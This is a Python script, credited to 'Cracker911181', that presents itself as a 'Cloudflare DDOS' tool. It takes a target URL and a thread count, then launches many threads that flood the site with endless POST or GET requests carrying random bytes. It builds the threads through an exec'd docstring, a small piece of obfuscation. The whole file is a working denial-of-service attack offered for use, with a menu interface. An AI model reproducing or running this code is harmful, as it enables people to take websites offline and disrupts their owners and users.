# Coded by Cracker
# CRACKER911181




import threading
import random 
import requests,os,sys,time


#text colour()
#creator: CRACKER911181

#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest



type = ''



datas = random._urandom(1490)
main_url = ''

def check():
	url = str(input(rosy+"\n\nEnter Your URL: "+colouroff))
	#url = url.replace('https://','http://')

	global type,main_url
	x = requests.post(url,data=datas)
	if x.status_code==200:
		type = "post"
		main_url = url
	else:
		type = 'get'
		main_url = url+"?"+str(datas)


def req():
	data = datas
	try:
		while True:
			try:
				if type=='post':
					requests.post(main_url,data=data)
				else:
					requests.get(main_url)
				print(red+"requests send")
			except:
				pass
	
	except:
		pass
	

def mainer():
	
	"""threading.Thread(target=req).start()"""
	exec(mainer.__doc__)



def main():
	try:
		check()
		thred = int(input(rosy+"\nEnter Thread Amount: "+colouroff))
		for _ in range(thred - 1):
			mainer.__doc__=mainer.__doc__+"\nthreading.Thread(target=req).start()"
		os.system("clear")
		print("\n\n\tTo stop Ddos press (ct + z)\n\n")
		mainer()
	
	except ValueError:
		print(e)
		print(red+"\n\n\t\tSomething went wrong!")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")




while True:
	os.system('clear')
	print(blue+f"""
   ____                _                _____           _
  / ___|_ __ __ _  ___| | _____ _ __   |_   _|__   ___ | |
 """+blue+"""| |   | '__/ _` |/ __| |/ / _ \ '__|____| |/ _ \ / _ \| |
 """+pest+"""| |___| | | (_| | (__|   <  __/ | |_____| | (_) | (_) | |
  \____|_|  \__,_|\___|_|\_\___|_|       |_|\___/ \___/|_|\n\n """+green+"""             Crack Your World, If You Can\n\n\t         """+blue+"""[★] Cloudflare DDOS [★] \n"""+green+""" ========================================================="""+colouroff)
	
	chose=str(input(pest+"\n\n\t\t1.DDOS Attack\n\t\t"+red+"00.Back To Home\n\n"+rosy+"Enter Your Option: "))
	
	if chose == "1":
		
		main()
		break
	
		
	elif chose == "00":
		break